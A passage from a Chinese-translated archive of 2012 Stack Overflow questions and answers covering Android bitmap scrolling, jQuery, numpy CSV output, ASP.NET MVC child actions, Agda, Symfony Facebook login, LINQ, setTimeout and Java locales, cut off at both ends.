        super(context, attrs, defStyle);
    }

    public void setSize(int width, int height) {
        background = new Paint();
        background.setColor(Color.WHITE);
        this.width = width;
        this.height = height;

        // Destination rect for our main canvas draw. It never changes.
        displayRect = new Rect(0, 0, width, height);
        // Scroll rect: this will be used to 'scroll around' over the
        // bitmap in memory. Initialize as above.
        scrollRect = new Rect(0, 0, width, height);
        // scrollRect = new Rect(0, 0, bmp.getWidth(), bmp.getHeight());
    }

    public void setImage(Bitmap bmp) {
        if (bmLargeImage != null)
            bmLargeImage.recycle();

    bmLargeImage = bmp;
        scrollRect = new Rect(0, 0, width, height);
        scrollRectX = 0;
        scrollRectY = 0;
        scrollByX = 0;
        scrollByY = 0;
    }

    @Override
    public boolean onTouchEvent(MotionEvent event) {
        return true; // done with this event so consume it
    }

    public void notifyScroll(float distX, float distY) {
        scrollByX = distX; // move update x increment
        scrollByY = distY; // move update y increment
    }

    @Override
    protected void onDraw(Canvas canvas) {

        if (bmLargeImage == null)
            return;

        if (scrollByX != 0 || scrollByY != 0) {
            // Our move updates are calculated in ACTION_MOVE in the opposite     direction
            // from how we want to move the scroll rect. Think of this as
            // dragging to
            // the left being the same as sliding the scroll rect to the right.
            int newScrollRectX = scrollRectX - (int) scrollByX;
            int newScrollRectY = scrollRectY - (int) scrollByY;
            scrollByX = 0;
            scrollByY = 0;

            // Don't scroll off the left or right edges of the bitmap.
            if (newScrollRectX < 0)
                newScrollRectX = 0;
            else if (newScrollRectX > (bmLargeImage.getWidth() - width))
                newScrollRectX = (bmLargeImage.getWidth() - width);

            // Don't scroll off the top or bottom edges of the bitmap.
            if (newScrollRectY < 0)
                newScrollRectY = 0;
            else if (newScrollRectY > (bmLargeImage.getHeight() - height))
                newScrollRectY = (bmLargeImage.getHeight() - height);
            scrollRect.set(newScrollRectX, newScrollRectY, newScrollRectX
                    + width, newScrollRectY + height);

            scrollRectX = newScrollRectX;
            scrollRectY = newScrollRectY;
        }

        canvas.drawRect(displayRect, background);
        // We have our updated scroll rect coordinates, set them and draw.
        canvas.drawBitmap(bmLargeImage, scrollRect, displayRect, background);

    }
} 
```

在手势监听器中，我有这个 onScroll 的实现

img 是您的 ScrollableImage 实例。

请记住将 setImage 与大图像一起使用。还可以使用 setSize 设置显示的大小。

```
public boolean onScroll(MotionEvent e1, MotionEvent e2,
            float distanceX, float distanceY) {
            img.notifyScroll(-distanceX, -distanceY);
            img.invalidate();
        return true;
    } 
```

在此链接上，您可以找到如何使用[BitmapRegionDecoder](http://developer.android.com/reference/android/graphics/BitmapRegionDecoder.html) API执行此操作的[示例。](https://github.com/johnnylambada/WorldMap)该示例有一个大的（6000,4000）世界图像，用户可以以全分辨率滚动。

# gwt - JavaFx Scene 和 GWT-Website 之间的通信

> ID：10862466
> 
> 赞同：0
> 
> 时间：2012-06-02T12:54:14.447
> 
> 标签：gwt, interface, javafx

我正在使用 JavaFx 场景来显示我的 Web 应用程序。为了创建 Web 应用程序，我使用了 GWT。

我知道 JavaFx 支持 JS-Scene 通信，但我不知道该怎么做，所以 GWT 编译器将创建可以与场景交互的代码。

是否有某种接口技术可以解决我的问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-16T06:38:06.930

在浏览器中运行的 Java Applet 和浏览器的 JavaScript 引擎之间有一座桥梁。所谓的 LiveConnect 规范描述了 JavaScript 代码如何与 Java 代码通信。

查看[从 JavaScript 代码调用 Applet 方法](http://docs.oracle.com/javase/tutorial/deployment/applet/invokingAppletMethodsFromJavaScript.html)和[从 Applet 调用 JavaScript 代码](http://docs.oracle.com/javase/tutorial/deployment/applet/invokingJavaScriptFromApplet.html)的 Java 教程。

您可能还想看看GWT 第三方库[GwtAI 。](http://code.google.com/p/gwtai/)

# javascript - 添加jQuery代码后锚点不起作用

> ID：10862467
> 
> 赞同：0
> 
> 时间：2012-06-02T12:54:30.063
> 
> 标签：javascript, jquery, html

这可能是一个初学者的问题，但在添加 jquery 代码以动画我的锚的背景后，我无法让我的链接工作。这是标记：

```
<ul class="nav">
<li> <span id="background"> </span><span id="active"></span><a href="page1.html"     class="active">page 1</a> </li>
<li> <a href="page2.html">page 2</a> </li>
</ul> 
```

这是jquery代码：

```
 $("ul.nav a").click(function () {
      $("span#background").fadeIn(800, function () {});
      $("#active").animate({left: "+=2410"}, 950)     
      return false;
    }); 
```

“跨度”元素通过 css 具有背景图像，并动态放置在活动`<li>`元素中。因此，活动链接获得了背景和动画图像。现在，当尝试单击第 2 页的链接时，正确的目标 URL 出现在浏览器中，但链接不起作用。可能正常的锚点动作受到 jquery 代码的干扰。有什么我忽略的吗？

[这是最基本的测试页](http://www.vuyk.eu/testsite/page1.html)

感谢任何有线索的人！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T12:56:55.477

`return false`杀死点击并阻止它触发。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T12:57:31.597

你应该使用

```
$("ul.nav a").click(function (e) {
      e.preventDefault();
      $("span#background").fadeIn(800, function () {});
      $("#active").animate({left: "+=2410"}, 950)     
    }); 
```

# python - Python 将 numpy 数组写入 CSV 文件

> ID：10862471
> 
> 赞同：8
> 
> 时间：2012-06-02T12:55:21.563
> 
> 标签：python, csv, numpy

我正在尝试将 2D numpy 数组写入 CSV 文件我试过这个：

```
import csv
import numpy as np

w = csv.writer(open('main.csv','w'))

Nlayers=23
N=364
TempLake=np.zeros((N,Nlayers))

for i in xrange(N-1):
    TempLake[i+1]=TempLake[i]+100

w.writerow(TempLake)

outfile = open('main.csv', 'w')

writer = csv.writer(outfile)

ar=np.array(TempLake)

for row in TempLake:
    writer.writerow(row)
outfile.close() 
```

为什么有些行仍然有引号？谢谢

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-06-02T13:25:36.217

使用[`numpy.savetxt`](http://docs.scipy.org/doc/numpy/reference/generated/numpy.savetxt.html)，指定逗号作为分隔符。

# asp.net-mvc-3 - 是否可以通过 URL 拒绝访问 PartialViewResult 操作

> ID：10862473
> 
> 赞同：1
> 
> 时间：2012-06-02T12:56:00.600
> 
> 标签：asp.net-mvc-3, security, action

我试图拒绝访问返回的操作`PartialViewResult`；但这似乎是不可能的。如果我用`NonAction`属性标记操作方法，页面将不会呈现，如果我不这样做，则可以使用 URL 获取该部分视图。
假设我有这个`_Layout.cshtml`：

```
<section role="navigation">
    @Html.Partial("PageParts/Sidebar")
    @RenderSection("SidebarContents", required: false)
</section> 
```

这是`PageParts/Sidebar.cshtml`：

```
@Html.Partial("PageParts/Sidebar/Userinfo")
@{Html.RenderAction("getNavigation", "PageSemantics");} 
```

这是`PageSemanticsController.cs`：

```
public class PageSemanticsController : Controller {

    public PartialViewResult getNavigation() {
        NavigationModel nm = new NavigationModel();
        return PartialView("PageParts/Sidebar/Navigation", nm);
    }
} 
```

最后是`~/Views/Shared/PageParts/Sidebar/Navigation.cshtml`：

```
@model NavigationModel
<nav id="main-nav">
    [... Some code to create Navigation ...]
</nav> 
```

* * *

此设置工作正常，但`~/PageSemantics/getNavigation`可通过 URL 访问。`getNavigation`有没有办法在保持此设置正常工作的同时拒绝通过 URL 访问操作？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-02T12:59:56.837

尝试放置属性

```
[ChildActionOnly] 
```

在你的`getNavigation()`方法上

# javascript - 如何将文本更改为文本输入元素 - jQuery

> ID：10862476
> 
> 赞同：1
> 
> 时间：2012-06-02T12:56:39.693
> 
> 标签：javascript, jquery

我的页面中有一个表格，如下所示；

```
<table id="tbl" cellpadding="0" cellspacing="0" style="width: 100%">
  <tr>
    <td class="field1s">field1x</td>
    <td class="field2s">field2x</td>
    <td class="field3s">field3x</td>
    <td class="field4s">field4x</td>
    <td class="xx">#</td>
  </tr>
</table> 
```

该表包含**这么多行**。当我单击最后一个单元格（xx）时，我希望行中的所有其他文本分别更改为`<input type="text" />`具有相应的类，并在其中包含相应的文本。并且当用户再次单击时`xx`，该行可能会使用更改的文本进行更新。

我已经捕获了数据并做了一些工作。

**[这](http://jsfiddle.net/767y4/)**是小提琴

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-02T13:13:21.973

我建议如下：

```
$('#tbl').on('click','.xx',function() {
    $(this).siblings().each(
        function(){
            // if the td elements contain any input tag
            if ($(this).find('input').length){
                // sets the text content of the tag equal to the value of the input
                $(this).text($(this).find('input').val());
            }
            else {
                // removes the text, appends an input and sets the value to the text-value
                var t = $(this).text();
                $(this).html($('<input />',{'value' : t}).val(t));
            }
        });
}); 
```

[JS 小提琴演示](http://jsfiddle.net/davidThomas/767y4/8/)。

* * *

**针对@mplungjan**的评论进行了[编辑](https://stackoverflow.com/questions/10862476/how-to-change-text-into-text-input-element-jquery/10862581#comment14151231_10862581)（如下）：

> `.text(something)`肯定比`.text("").append(something)`任何情况都更快、更容易阅读。而且您不是添加文本而是添加 html，因此更有理由使用`html()`.

他是对的，当然。所以：

```
$('#tbl').on('click','.xx',function() {
    $(this).siblings().each(
        function(){
            if ($(this).find('input').length){
                $(this).text($(this).find('input').val());
            }
            else {
                var t = $(this).text();
                $(this).html($('<input />',{'value' : t}).val(t));
            }
        });
}); 
```

[JS 小提琴演示](http://jsfiddle.net/davidThomas/767y4/11/)。

参考：

*   [`append()`](http://api.jquery.com/append/).
*   [`each()`](http://api.jquery.com/each/).
*   [`find()`](http://api.jquery.com/find/).
*   [`siblings()`](http://api.jquery.com/siblings/).
*   [`text()`](http://api.jquery.com/text/).
*   [`val()`](http://api.jquery.com/val/).

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-03T05:33:39.610

这是我的版本 - 我觉得我应该发布它，因为我一直对所有给定的建议发表评论

[演示](http://jsfiddle.net/mplungjan/eQZp4/)

```
$('#tbl .xx').toggle(
  function() {
    $(this).siblings().each(function(){
      var t = $(this).text();
      $(this).html($('<input />',{'value' : t}));
    });
  },
  function() {
    $(this).siblings().each(function(){
      var inp = $(this).find('input');
      if (inp.length){
        $(this).text(inp.val());
      }
    });
  }    
); 
```

如果你给字段相同的类，你可以做

`$(".field").each(`

代替

`$(this).siblings().each(`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-02T13:04:31.497

这是正在工作的 jsfiddle，其中包含解释内容的注释：

[http://jsfiddle.net/767y4/6/](http://jsfiddle.net/767y4/6/)

```
$('#tbl').on('click','.xx',function() {
    // active, means we were in input mode - revert input to td
    if ($(this).hasClass('active')) {
        // go through each input in the table
        $('#tbl input').each(function() {
           // get input text
           var colData = $(this).val();
           // get input class
           var colClass = $(this).attr('class');
           // create td element
           var col = $('<td></td>');
           // fill it with data
           col.addClass(colClass).text(colData);
           // now. replace
           $(this).replaceWith(col);
        });
    } else {
        // go through each column in the table
        $('#tbl td:not(.xx)').each(function() {
           // get column text
           var colData = $(this).text();
           // get column class
           var colClass = $(this).attr('class');
           // create input element
           var input = $('<input />');
           // fill it with data
           input.addClass(colClass).val(colData);
           // now. replace
           $(this).replaceWith(input);
        });

    }

    // give link class active to detect if we are in input mode
    $(this).toggleClass('active');
}); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-02T13:00:38.843

根据你的小提琴，你几乎做的一切都很好，你只需要使用

```
$col1.html('<input type="text" />'); 
```

大功告成，单元格的内容更改为输入字段。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-02T13:03:02.217

**更新：**

```
$('#tbl').on('click','.xx',function() {
    $('td').not(':last').each(function(){
      var val = $(this).text()      
      $(this).text('').append("<input type='text' value=" + val + ">")
    })
});

$('td:last').click(function() {
    $(this).toggleClass('xx');
})       

$('td:last').on("click", function(){

$('input').each(function(){
     var tex = $(this).val();
     $(this).replaceWith(tex);
})

}) 
```

[http://jsfiddle.net/767y4/10/](http://jsfiddle.net/767y4/10/)

# agda - Agda 和二叉搜索树

> ID：10862478
> 
> 赞同：5
> 
> 时间：2012-06-02T12:56:46.673
> 
> 标签：agda

请注意，这是一个作业，所以最好不要发布完整的解决方案，相反，我只是卡住了，需要一些关于我接下来应该看什么的提示。

```
module BST where

open import Data.Nat
open import Relation.Binary.PropositionalEquality
open import Relation.Binary
open DecTotalOrder decTotalOrder using () renaming (refl to ≤-refl; trans to ≤-trans)

data Ord (n m : ℕ) : Set where
  smaller : n < m -> Ord n m
  equal   : n ≡ m -> Ord n m
  greater : n > m -> Ord n m

cmp : (n m : ℕ) -> Ord n m
cmp zero zero       = equal refl
cmp zero (suc n)    = smaller (s≤s z≤n)
cmp (suc n) zero    = greater (s≤s z≤n)
cmp (suc n) (suc m) with cmp n m 
... | smaller n<m-pf = smaller (s≤s n<m-pf)
... | equal   n≡m-pf = equal (cong suc n≡m-pf)
... | greater n>m-pf = greater (s≤s n>m-pf)

-- To keep it simple and to exclude duplicates,
-- the BST can only store [1..]
--
data BST (min max : ℕ) : Set where
  branch : (v : ℕ)
         → BST min v → BST v max 
         → BST min max
  leaf   : min < max -> BST min max 
```

这些已经导入：

```
≤-refl : ∀ {a} → a ≤ a 

≤-trans : ∀ {a b c} → a ≤ b → b ≤ c → a ≤ c 
```

我们需要实现这个扩大 BST 范围的函数：

```
widen : ∀{min max newMin newMax}
      → BST min max
      → newMin ≤ min
      → max ≤ newMax
      → BST newMin newMax 
```

到目前为止我有这个：

```
widen : ∀{min max newMin newMax}
      → BST min max
      → newMin ≤ min
      → max ≤ newMax
      → BST newMin newMax
widen (leaf min<max-pf) newMin<min-pf max<newMax-pf = BST newMin<min-pf max<newMax-pf
widen (branch v l r) newMin<min-pf max<newMax = branch v 
                                                (widen l newMin<min-pf max<newMax) 
                                                (widen r newMin<min-pf max<newMax) 
```

现在这显然不起作用，因为新边界不必严格小于/大于最小值/最大值。给出了一个提示：`It is not strictly necessary, but you may find it helpful to implement an auxiliary function that widens the range of a strictly smaller than relation of the form min < max.`这就是我在这里所做的，显然我需要改变一些事情，但我认为基本的想法就在那里。

这就是我所处的位置，我只是真的不知道从这里去哪里，我已经做了尽可能多的研究，但是没有很多关于使用 Agda 的阅读材料。我是否可能需要使用 ≤-refl 或 ≤-trans？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-02T17:03:13.557

# jquery - 'openInfoWindow' 在 Google 地图上导致错误 jQuery-ui

> ID：10862481
> 
> 赞同：1
> 
> 时间：2012-06-02T12:57:29.860
> 
> 标签：jquery, google-maps, jquery-ui-map

我需要一些帮助来使用 jquery-ui-map v3 在 Google 地图上添加 infoWindows

我正在从 MySQL 数据库中获取标记，我正在尝试从存储在数据中的每个位置的描述中添加 infowindow，但我一直收到此错误

**未捕获 gmap 小部件实例的此类方法“openInfoWindow”**

```
function initMap(container, pos, zoom) {
    $(container).gmap({
        'center': pos,
        'zoom': zoom,
        'zoomControlOptions': {
            'position': google.maps.ControlPosition.LEFT_TOP
        },
        'callback': function () {
            $.getJSON('backend/addmarkers.php', function (data) {
                $.each(data, function (i, m) {
                    $(container).gmap('addMarker', {
                        'position': new google.maps.LatLng(m.latitude, m.longitude),
                        'icon': 'markers/' + m.cat_img,
                        draggable: false
                    }).click(function () {
                        $(container).gmap('openInfoWindow', {
                            'content': m.description
                        }, this)
                    });
                });
            });
        }
    });
} 
```

请帮帮我，在这件事上周一运行。我有一个学术报告要做。谢谢

# symfony - 无法让自定义用户提供程序与 FOSFacebookBundle 和 FOSUserBundle 一起使用

> ID：10862488
> 
> 赞同：1
> 
> 时间：2012-06-02T12:58:25.387
> 
> 标签：symfony, fosuserbundle

我试图让两个捆绑包一起工作，以便在使用提供的 facebook 登录按钮发生 facebook 登录时创建并登录一个新用户。

我已经根据堆栈溢出的其他问题尝试了很多事情，但我仍然无法让它工作。这是我的代码（我已经将我尝试过的一些东西放在评论中；我基本上尝试了每种可能的组合）：

**配置.yml**

```
fos_facebook:
  file:   %kernel.root_dir%/../vendor/facebook/src/base_facebook.php
  alias:  facebook
  app_id: FOO
  secret: BAR
  cookie: true
  permissions: [email, user_birthday]

fos_user:
    db_driver: orm
    firewall_name: public
    user_class: Not\NotBundle\Entity\User 
```

**路由.yml**

```
# fos_user_security:
#     resource: "@FOSUserBundle/Resources/config/routing/security.xml"

_security_check:
    pattern:  /login_check

_security_logout:
    pattern:  /logout 
```

**安全.yml**

```
security:
factories:
    - "%kernel.root_dir%/../vendor/bundles/FOS/FacebookBundle/Resources/config/security_factories.xml"

role_hierarchy:
    ROLE_ADMIN:       ROLE_USER
    ROLE_SUPER_ADMIN: [ROLE_USER, ROLE_ADMIN, ROLE_ALLOWED_TO_SWITCH]

providers:
    # chain_provider:
    #     providers: [fos_userbundle, my_fos_facebook_provider]
    # fos_userbundle:
    #     id: fos_user.user_manager
    my_fos_facebook_provider:
        id: my.facebook.user

encoders:
    "FOS\UserBundle\Model\UserInterface": sha512

firewalls:
    dev:
        pattern:  ^/(_(profiler|wdt)|css|images|js)/
        security: false
    public:
        pattern:   ^/.*
        fos_facebook:
            app_url: "http://apps.facebook.com/FOO/"
            server_url: "http://not.not/facebookApp/"
            login_path: ^/login$
            check_path: ^/login_check$
            default_target_path: /
            provider: my_fos_facebook_provider
        # form_login:
        #     login_path: /login
        #     check_path: /login_check
        #     provider: fos_userbundle
        anonymous: true
        logout:
            handlers: ["fos_facebook.logout_handler"] 
```

**服务.yml**

```
parameters:
    #my_facebook_user.class: Not\NotBundle\Security\User\Provider\FacebookProvider

services:
    my.facebook.user:
        class: Not\NotBundle\Security\User\Provider\FacebookProvider
        arguments:
            facebook: "@fos_facebook.api"
            userManager: "@fos_user.user_manager"
            # userManager: "@my.facebook.user" # <-- Tried this as well but gives: Fatal error: Allowed memory size of 134217728 bytes exhausted (tried to allocate 523800 bytes) in /Foo/vendor/symfony/src/Symfony/Component/DependencyInjection/Compiler/ServiceReferenceGraphEdge.php  
            validator: "@validator"
            container: "@service_container" 
```

基本上这个配置最接近 FOSFacebookBundle 文档。目前我收到错误：

> 找不到路径“/login_check”的控制器。也许您忘记在路由配置中添加匹配的路由？

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T16:53:52.880

`check_path`for`fos_facebook`和`form_login`身份验证提供程序应该不同。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-06T08:02:24.217

将检查路径和登录路径更改为路由解决了我的问题：

**安全.yml**

```
firewalls:
    dev:
        pattern:  ^/(_(profiler|wdt)|css|images|js)/
        security: false
    public:
        pattern:   ^/.*
        fos_facebook:
            app_url: "http://apps.facebook.com/Foo/"
            server_url: "http://localhost/facebookApp/"
            login_path: NotNotBundle_homepage
            check_path: _security_check
            default_target_path: /
        anonymous: true
        logout:
            handlers: ["fos_facebook.logout_handler"] 
```

# javascript - jQuery - 删除一个 div 元素

> ID：10862490
> 
> 赞同：0
> 
> 时间：2012-06-02T12:59:01.170
> 
> 标签：javascript, jquery, html, css

我正在做一个项目，在那里我遇到了一些用户界面调整，我需要删除一些 HTML div 元素。

请检查此代码[http://jsfiddle.net/YVZH5/](http://jsfiddle.net/YVZH5/)如果单击文本，您将看到蓝色标记。当用户单击 X 时，我需要删除该标签。但它不起作用。

它在这里工作[http://jsfiddle.net/Jst4v/](http://jsfiddle.net/Jst4v/)那么，问题出在哪里？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-02T13:00:02.190

你需要改变

```
$("#service-sets").click(function(){
    $("#facebook-tag").remove();
}); 
```

至

```
$("#service-sets").on('click', '#facebook-del', function(){
    $("#facebook-tag").remove();
}); 
```

因为，`#facebook-del`（十字图标）将删除标签，并且在 DOM 准备好后它们会来到 DOM，所以它们需要委托，即实时事件。

**[演示](http://jsfiddle.net/thecodeparadox/w3hXe/2/)**

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-02T13:06:01.087

它在您的第一个小提琴而不是您的第二个小提琴中起作用的原因是因为您尝试将点击功能附加到 (facebook-del) 的元素在分配时不存在于 DOM 中。

在第二个示例中，元素存在于页面加载中，因此被分配了点击功能。

尝试将 .on() 视为将点击事件分配给像这样动态添加的元素的一种方式。

# c# - 无法创建常量值 - 只有原始类型

> ID：10862491
> 
> 赞同：30
> 
> 时间：2012-06-02T12:59:05.567
> 
> 标签：c#, linq

两个简单的查询 - 异常发生在：

```
matchings.Any(u => product.ProductId == u.ProductId) 
```

怎么了？如果我改写`true`，一切都很好。

```
var matchings = (from match in db.matchings 
                 where match.StoreId == StoreId 
                 select match).ToList();

var names = (from product in db.Products
             where matchings.Any(u => product.ProductId == u.ProductId)
             select product).ToList(); 
```

* * *

## 回答 #1

> 赞同：52
> 
> 时间：2012-06-02T13:06:30.890

第一种方式：

`ToList()`在第一个查询中删除。

或者

```
//instead of retrieving mathings List, retrieve only the productIds you need (which are a List of Primitive types)
var productIdList = db.matchings
.Where(m => m.StoreId == StoreId)
.Select(x => x.ProductId)
.ToList();

var products = db.Products
.Where(p => productIdList
           .Contains(p.ProductId))
.ToList(); 
```

或者

```
//other way
var produts = db.Products
             .Where(p => db.matchings
                        .Any(m => m.StoreId == StoreId && 
                             m.ProductId == p.ProductId)
                    )
             .ToList(); 
```

因为我认为您在 linq2entities 中，并且您在不可能的查询中使用了匹配列表（您的主题标题往往让我相信这是您的问题）。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-06-02T13:12:46.113

这看起来像是一个使用 join 的地方

```
 var query =
    from product in db.Products
    join matching in db.Matchings
    on product.ProductId equals matching.ProductId into matchGroup
    where matchGroup.Count() > 0 and matching.StoreId == StoreId
    select product; 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-09-08T21:07:58.700

在使用集合和 EF 表编写以下查询时，我遇到了同样的问题：

```
var result = (from listItem in list
              join dbRecord in Context.MY_TABLE
                  on listItem.MyClass.ID equals dbRecord.ID
              select new { dbRecord, listItem.SomeEnum }).ToList(); 
```

我可以通过**更改源顺序**来解决它`in`：

```
var result = (from dbRecord in Context.MY_TABLE
              join listItem in list
                  on dbRecord.ID equals listItem.MyClass.ID
              select new { dbRecord, listItem.SomeEnum }).ToList(); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-17T14:10:41.890

您可以尝试以下方法。它作为我的可为空类型的 ProductId 操作系统对我有用。

```
IQueryable<matchings> data = db.matchings.Any(u => product.ProductId.Value == u.ProductId); 
```

或这个

```
IQueryable<matchings> data = db.matchings.Any(u => product.ProductId.Value.Equals(u.ProductId)); 
```

这在我的情况下有效，因为目标 id 是可空类型，因为它指向 1:0 -> * 关系。

# c# - 在 Facebook ASPX 中分享内容

> ID：10862498
> 
> 赞同：0
> 
> 时间：2012-06-02T13:00:24.777
> 
> 标签：c#, asp.net, facebook

我的想法很简单，我希望在我的页面上看到新新闻或事件的人可以在 facebook 上分享。我想通过一个 .aspx 页面来做到这一点。
这可能吗？如果是这样，我该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T13:48:19.773

在这里，您可以访问所有主要的社交网站，只需在母版页上添加链接，然后将它们填充到其后面的代码中：

```
 gplus.HRef = "https://plusone.google.com/_/+1/confirm?title=" + HttpUtility.UrlEncode(Page.Title) + "&amp;url=" + HttpUtility.UrlEncode(Request.Url.AbsoluteUri);
    facebook.HRef = "http://www.facebook.com/sharer.php?t=" + HttpUtility.UrlEncode(Page.Title) + "&amp;u=" + HttpUtility.UrlEncode(Request.Url.AbsoluteUri);
    linkedin.HRef = "http://www.linkedin.com/shareArticle?mini=true&amp;title=" + HttpUtility.UrlEncode(Page.Title) + "&amp;url=" + HttpUtility.UrlEncode(Request.Url.AbsoluteUri);
    myspace.HRef = "http://www.myspace.com/Modules/PostTo/Pages/?t=" + HttpUtility.UrlEncode(Page.Title) + "&amp;u=" + HttpUtility.UrlEncode(Request.Url.AbsoluteUri);
    twitter.HRef = "http://twitter.com/share?text=" + HttpUtility.UrlEncode(Page.Title) + "&amp;url=" + HttpUtility.UrlEncode(Request.Url.AbsoluteUri); 
```

google plus 也适用于 g+1（加一）...

# javascript - 通过超时在Javascript中休眠？

> ID：10862503
> 
> 赞同：1
> 
> 时间：2012-06-02T13:01:07.977
> 
> 标签：javascript, firefox-addon, timeout, sleep, wait

我想等待 1 分钟，然后执行一个函数*f()*。我发现在*Javascript*中没有*sleep()*函数，但我可以使用*setInterval()*或*setTimeout()*函数。

*window.setInterval()*函数有效，但这不是我想要的。我只想执行一次*f()*。我尝试如下使用*setTimeout()* [函数。](http://www.geekpedia.com/KB55_How-do-I-make-a-JavaScript-function-wait-before-executing-%28sleep-or-delay%29.html)

```
var MyNamespace {
  ...
  f: function() {
  },
  ...
  click: function() {
    ...
    setTimeout("this.f()", 60000); // f() is never executed
    // setTimeout(this.f(), 60000); f() is executed immediately without timeout
    // window.setTimeout(...) doesn't help
  },
  ...
} 
```

这里有什么问题？

该代码是*Firefox*扩展的一部分。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-02T13:04:31.863

有你的问题：`"this.f()"`。将其替换为：

```
setTimeout(this.f.bind(this), 60000); 
```

它应该可以工作。将字符串传递给`setInterval()`永远不是一个好的解决方案，就像使用`eval()`.

# 也可以看看

*   [为什么我不能将“window.location.reload”作为参数传递给 setTimeout？](https://stackoverflow.com/questions/10839989)- 复制？

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-02T13:04:23.137

尝试

```
setTimeout( this.f.bind(this), 60000 ); 
```

切勿将字符串传递给，`setTimeout`因为它将在全局上下文中进行评估。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-03T04:24:03.077

如果您在 chrome 中运行计时器，还请查看 nsiTimer：[https ://developer.mozilla.org/en/nsITimer](https://developer.mozilla.org/en/nsITimer)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-09-27T05:34:14.490

由于该代码适用于您应该使用的 Firefox 扩展

```
setTimeout(function() { alert('timeout') },2000);

setTimeout(alert('timeout'),2000); // will be executed directly, not suitable 
```

# objective-c - 链接到未来操作系统中可用的 API

> ID：10862506
> 
> 赞同：0
> 
> 时间：2012-06-02T13:01:16.060
> 
> 标签：objective-c, macos, linker

无需详细说明和破坏 NDA ......

如果 OSX 的开发人员预览显示某个 API 现在是 AppKit 的一部分，而我以前必须将 API 实现为类的一个类别，我该如何安排事情，以便构建和链接到该未来 SDK 的东西仍然可以运行在当前操作系统上。

因此，在当前用于 Lion 的 SDK 的抽象意义上，我`coolThing`在类的类别中定义了该方法，`NSFooBar`因此我可以调用

`object.thing = fooBarInstance.coolThing`

然而，未来的 SDK 向我展示了`coolThing`现在由 SDK 提供的内容，因此我的类别在构建时发生冲突。

当我在没有这种混乱的情况下链接到未来的 SDK 时，我能否确保我的应用程序仍然可以在 Lion 上运行（符号不可用）。

```
if(OSVersion == Lion) {
    return myImplementation;
}
else {
    return SDKNativeImplementaion;
} 
```

我想我可以隐藏在类别中，但看起来有点乱。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T13:16:50.943

这就是您应该为[您的类别方法添加前缀](https://developer.apple.com/library/mac/#documentation/MacOSX/Conceptual/BPFrameworks/Concepts/CreationGuidelines.html)的原因。因此，您可以代替`coolThing`，调用它`wb_coolThing`或类似的名称。您的类别方法可以在运行时检查是否有`coolThing`方法，如果可用则调用该方法，如果没有则使用您自己的实现。

# java - 在java中获取操作系统语言

> ID：10862507
> 
> 赞同：7
> 
> 时间：2012-06-02T13:01:20.617
> 
> 标签：java, internationalization, resourcebundle

我在这里遇到了一种问题。

我是法国人，正在开发英文版的 Windows XP。因此，我将区域选项设置为法语，但仍然有英语 UI。

我正在开发一个小型 Java SE 应用程序，并决定使用资源包将其国际化。

为了显示正确的语言，我用这个函数创建了包：

```
private static ResourceBundle bundle = ResourceBundle
          .getBundle("locale.Strings", Locale.getDefault()); 
```

但是 Locale.getDefault() 函数返回区域设置（意思是：法语）而不是系统 UI 语言。结果，我的 UI 在英语环境中默认为法语。好吧，这并不是我所期望的......

有谁知道一种独立于平台的方式来恢复系统 UI 语言？提前致谢 ！

编辑：将本地修复为区域设置，谢谢。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-02T13:41:38.907

这是 Windows 中的错误配置。返回系统区域设置，而`Locale#getDefault()`不是日期/时间格式化区域或位置。

在下面的 Windows XP 特定屏幕截图中，您可以将*区域选项*和*语言*设置为法语或任何您喜欢的。*高级*菜单中的下拉菜单实际上设置了系统区域设置，在您的情况下应该设置为英语。

![在此处输入图像描述](../Images/ef4763055f8e86c3cb4d42566d686ddd.png)

诚然，这在 Windows XP 中解释得不好，Windows 7 做得更好一些：

![在此处输入图像描述](../Images/d19378c50ac13844608684c42d1d46c7.png)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-02T20:19:51.757

我没有办法尝试（因为我倾向于避免微软制造的任何东西），但看看这些：

需要 Java 7：

```
Locale uiLocale = Locale.getDefault(Locale.Category.DISPLAY); 
```

无论如何，这应该用于获取翻译（从 Java 7 开始）。

如果这不是很有帮助，我会尝试：

```
System.out.println(System.getenv("LC_MESSAGES"));       
System.out.println(System.getenv("LANG"));
System.out.println(System.getenv("LANGUAGE")); 
```

但是，在这种情况下，我希望与默认语言环境有一些相似之处......

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-03T08:54:16.760

感谢您的建议，我尝试了一些事情，这是我的观察：

*   如果您使用的是 Java 6 而不是 Java 7，那您就完蛋了。
*   如果您使用的是 Java 7，您应该按照 BalusC 的说明进行操作：更改区域和语言设置中的设置。之后，Locale.getDefault() 将默认返回显示语言，如果您将其设置为英语，则表示英语。为了确保这一点，您可以通过调用 Locale.getDefault(Locale.Category.DISPLAY) 创建您的语言环境

# php - 从 iso-8859-2 到 UTF8 的 PDO 字符集

> ID：10862511
> 
> 赞同：1
> 
> 时间：2012-06-02T13:01:49.357
> 
